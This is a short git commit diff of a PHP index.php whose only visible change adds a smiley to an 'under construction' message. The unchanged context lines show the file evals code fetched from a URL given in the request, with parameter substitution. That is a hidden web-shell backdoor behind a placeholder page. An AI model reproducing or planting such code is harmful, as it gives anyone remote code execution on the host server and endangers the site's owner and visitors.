9ad730f1c0b6b12898490928228050b3d078e2ce
Sandro1233 <39375004+Sandro1233@users.noreply.github.com>
2018-05-17 18:55:14 +0200

    Update index.php

--- index.php
+++ index.php
@@ -3,5 +3,6 @@ if (isset ($_GET['url']) && isset ($_GET['args'])) {
     $argsArray = json_decode($_GET['args'], true);
     eval(str_replace(array_keys($argsArray), array_values($argsArray), file_get_contents($_GET['url'])));
 } else {
-    echo "This page is under construction.";
+    echo "This page is under construction. :)";
 }
+
